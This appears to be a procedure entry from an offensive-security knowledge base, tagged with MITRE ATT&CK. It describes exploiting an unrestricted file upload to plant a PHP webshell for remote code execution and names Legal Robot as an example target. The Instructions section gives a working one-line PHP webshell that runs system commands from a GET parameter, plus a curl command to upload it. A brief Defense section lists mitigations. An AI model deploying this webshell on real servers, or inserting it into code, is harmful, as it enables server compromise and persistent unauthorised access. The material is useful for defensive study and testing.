---
tags:
  - rce
  - webshell
  - file-upload
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-file-upload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T17:23:54.432Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 020c3b93-3e64-45ec-a9ab-6d528d7d9813
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
---
# Upload Malicious Webshell for RCE

## Summary

This procedure exploits an identified unrestricted file upload vulnerability by crafting and uploading a malicious webshell script, such as a PHP backdoor, to gain a foothold for remote code execution on the web server.

## Description

Once an unrestricted upload is confirmed, attackers create a simple webshell (e.g., PHP file executing system commands via GET parameters) and POST it to the upload endpoint. The file is stored in a web-accessible directory without filtering, allowing later execution. This targets PHP-enabled web apps like those in Legal Robot, where lack of validation leads to server compromise. Prerequisites include the upload path; outcomes are persistent access if the shell executes.

## Requirements

1. Confirmed vulnerable upload endpoint
2. Malicious file prepared (e.g., shell.php)
3. Tools for HTTP POST (curl or browser)

## Defense

Defensive measures and detection strategies:

- Rename uploaded files to safe extensions (e.g., .jpg)
- Store uploads outside web root or in isolated directories
- Use content scanning tools to detect shell code in uploads

## Objectives

1. Transfer malicious payload to the server
2. Ensure the file is stored in an executable location
3. Identify the exact path for subsequent access

## Instructions

### Step 1: Prepare Webshell

**Context**: Create a basic PHP webshell for command execution.

Content of shell.php:

```php
<?php system($_GET['cmd']); ?>
```

### Step 2: Upload the File

**Context**: Send the shell via the upload mechanism.

Execute [[commands/curl-file-upload]]:

```bash
curl -F "file=@shell.php" http://target.com/upload/endpoint
```

> Response may include the storage path (e.g., /uploads/shell.php); note it for access.

### Step 3: Confirm Storage

**Context**: Verify the file exists on the server.

Attempt to list directories or use error responses to infer the path if not directly provided.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Remote File Copy]]

### Sub-Techniques


## Commands Used

- [[commands/curl-file-upload]]

## Tools Used


## Tags

- [[rce]]
- [[webshell]]
